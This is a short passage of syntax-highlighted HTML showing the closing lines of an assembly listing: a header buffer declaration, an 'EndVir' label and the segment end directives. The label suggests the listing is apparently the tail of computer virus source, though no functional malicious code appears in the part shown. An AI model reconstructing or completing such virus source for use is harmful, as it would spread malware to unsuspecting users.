</span><span class="sc5">Header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">EndVir</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
